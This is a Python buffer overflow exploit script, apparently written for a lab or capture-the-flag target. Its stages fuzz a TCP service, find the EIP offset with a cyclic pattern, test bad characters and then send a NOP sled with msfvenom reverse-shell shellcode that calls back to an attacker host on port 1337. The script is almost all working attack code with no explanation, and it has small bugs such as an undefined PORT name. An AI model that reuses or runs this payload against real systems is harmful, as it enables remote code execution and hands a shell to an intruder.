#!/usr/bin/python3

import socket
from struct import pack

IP = "10.10.62.94"
port = 21449

def fuzz():
    try:
        for i in range(0,10000,500):
            buffer = b"A"*i
            print("Fuzzing %s bytes" % i)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((IP, port))
            s.send(buffer)
            breakpoint()
            s.close()
    except:
        print("Could not establish a connection")

def eip_offset():
    pattern = bytes("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac"
                    "9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8"
                    "Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7A"
                    "i8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al"
                    "7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6"
                    "Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq", "utf-8")

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(pattern)
    s.close()

def eip_control():
    offset = 469
    buffer = b"A"*offset
    eip = b"B"*4
    payload = buffer + eip

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(payload)
    s.close()

def bad_chars():
    all_chars = bytes([
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
    0x0E, 0x0F, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15,
    0x16, 0x17, 0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D,
    0x1E, 0x1F, 0x20, 0x21, 0x22, 0x23, 0x24, 0x25,
    0x26, 0x27, 0x28, 0x29, 0x2A, 0x2B, 0x2C, 0x2D,
    0x2E, 0x2F, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35,
    0x36, 0x37, 0x38, 0x39, 0x3A, 0x3B, 0x3C, 0x3D,
    0x3E, 0x3F, 0x40, 0x41, 0x42, 0x43, 0x44, 0x45,
    0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D,
    0x4E, 0x4F, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55,
    0x56, 0x57, 0x58, 0x59, 0x5A, 0x5B, 0x5C, 0x5D,
    0x5E, 0x5F, 0x60, 0x61, 0x62, 0x63, 0x64, 0x65,
    0x66, 0x67, 0x68, 0x69, 0x6A, 0x6B, 0x6C, 0x6D,
    0x6E, 0x6F, 0x70, 0x71, 0x72, 0x73, 0x74, 0x75,
    0x76, 0x77, 0x78, 0x79, 0x7A, 0x7B, 0x7C, 0x7D,
    0x7E, 0x7F, 0x80, 0x81, 0x82, 0x83, 0x84, 0x85,
    0x86, 0x87, 0x88, 0x89, 0x8A, 0x8B, 0x8C, 0x8D,
    0x8E, 0x8F, 0x90, 0x91, 0x92, 0x93, 0x94, 0x95,
    0x96, 0x97, 0x98, 0x99, 0x9A, 0x9B, 0x9C, 0x9D,
    0x9E, 0x9F, 0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5,
    0xA6, 0xA7, 0xA8, 0xA9, 0xAA, 0xAB, 0xAC, 0xAD,
    0xAE, 0xAF, 0xB0, 0xB1, 0xB2, 0xB3, 0xB4, 0xB5,
    0xB6, 0xB7, 0xB8, 0xB9, 0xBA, 0xBB, 0xBC, 0xBD,
    0xBE, 0xBF, 0xC0, 0xC1, 0xC2, 0xC3, 0xC4, 0xC5,
    0xC6, 0xC7, 0xC8, 0xC9, 0xCA, 0xCB, 0xCC, 0xCD,
    0xCE, 0xCF, 0xD0, 0xD1, 0xD2, 0xD3, 0xD4, 0xD5,
    0xD6, 0xD7, 0xD8, 0xD9, 0xDA, 0xDB, 0xDC, 0xDD,
    0xDE, 0xDF, 0xE0, 0xE1, 0xE2, 0xE3, 0xE4, 0xE5,
    0xE6, 0xE7, 0xE8, 0xE9, 0xEA, 0xEB, 0xEC, 0xED,
    0xEE, 0xEF, 0xF0, 0xF1, 0xF2, 0xF3, 0xF4, 0xF5,
    0xF6, 0xF7, 0xF8, 0xF9, 0xFA, 0xFB, 0xFC, 0xFD,
    0xFE, 0xFF
    ])

    offset = 469
    buffer = b"A"*offset
    eip = b"B"*4
    payload = buffer + eip + all_chars

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, PORT))
    s.send(payload)
    s.close()

def exploit():
    # msfvenom -p 'windows/shell_reverse_tcp' LHOST=10.10.15.163 LPORT=1337 -f 'python' -b '\x00\x09\x0a\x0b\x0c\x0d' # e.g. '\x00\x0a\x0d
    buf =  b""
    buf += b"\xb8\xe0\x58\x50\xdd\xd9\xc0\xd9\x74\x24\xf4\x5a"
    buf += b"\x33\xc9\xb1\x52\x31\x42\x12\x03\x42\x12\x83\x22"
    buf += b"\x5c\xb2\x28\x5e\xb5\xb0\xd3\x9e\x46\xd5\x5a\x7b"
    buf += b"\x77\xd5\x39\x08\x28\xe5\x4a\x5c\xc5\x8e\x1f\x74"
    buf += b"\x5e\xe2\xb7\x7b\xd7\x49\xee\xb2\xe8\xe2\xd2\xd5"
    buf += b"\x6a\xf9\x06\x35\x52\x32\x5b\x34\x93\x2f\x96\x64"
    buf += b"\x4c\x3b\x05\x98\xf9\x71\x96\x13\xb1\x94\x9e\xc0"
    buf += b"\x02\x96\x8f\x57\x18\xc1\x0f\x56\xcd\x79\x06\x40"
    buf += b"\x12\x47\xd0\xfb\xe0\x33\xe3\x2d\x39\xbb\x48\x10"
    buf += b"\xf5\x4e\x90\x55\x32\xb1\xe7\xaf\x40\x4c\xf0\x74"
    buf += b"\x3a\x8a\x75\x6e\x9c\x59\x2d\x4a\x1c\x8d\xa8\x19"
    buf += b"\x12\x7a\xbe\x45\x37\x7d\x13\xfe\x43\xf6\x92\xd0"
    buf += b"\xc5\x4c\xb1\xf4\x8e\x17\xd8\xad\x6a\xf9\xe5\xad"
    buf += b"\xd4\xa6\x43\xa6\xf9\xb3\xf9\xe5\x95\x70\x30\x15"
    buf += b"\x66\x1f\x43\x66\x54\x80\xff\xe0\xd4\x49\x26\xf7"
    buf += b"\x1b\x60\x9e\x67\xe2\x8b\xdf\xae\x21\xdf\x8f\xd8"
    buf += b"\x80\x60\x44\x18\x2c\xb5\xcb\x48\x82\x66\xac\x38"
    buf += b"\x62\xd7\x44\x52\x6d\x08\x74\x5d\xa7\x21\x1f\xa4"
    buf += b"\x20\x44\xea\xa9\x13\x30\xe8\xb5\x56\xf8\x65\x53"
    buf += b"\x32\xea\x23\xcc\xab\x93\x69\x86\x4a\x5b\xa4\xe3"
    buf += b"\x4d\xd7\x4b\x14\x03\x10\x21\x06\xf4\xd0\x7c\x74"
    buf += b"\x53\xee\xaa\x10\x3f\x7d\x31\xe0\x36\x9e\xee\xb7"
    buf += b"\x1f\x50\xe7\x5d\xb2\xcb\x51\x43\x4f\x8d\x9a\xc7"
    buf += b"\x94\x6e\x24\xc6\x59\xca\x02\xd8\xa7\xd3\x0e\x8c"
    buf += b"\x77\x82\xd8\x7a\x3e\x7c\xab\xd4\xe8\xd3\x65\xb0"
    buf += b"\x6d\x18\xb6\xc6\x71\x75\x40\x26\xc3\x20\x15\x59"
    buf += b"\xec\xa4\x91\x22\x10\x55\x5d\xf9\x90\x65\x14\xa3"
    buf += b"\xb1\xed\xf1\x36\x80\x73\x02\xed\xc7\x8d\x81\x07"
    buf += b"\xb8\x69\x99\x62\xbd\x36\x1d\x9f\xcf\x27\xc8\x9f"
    buf += b"\x7c\x47\xd9"

	
    offset = 469
    buffer = b"A"*offset
    eip = pack('<L', 0x621014E3)
    nop = b"\x90"*32
    payload = buffer + eip + nop + buf

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, PORT))
    s.send(payload)
    s.close()

exploit()

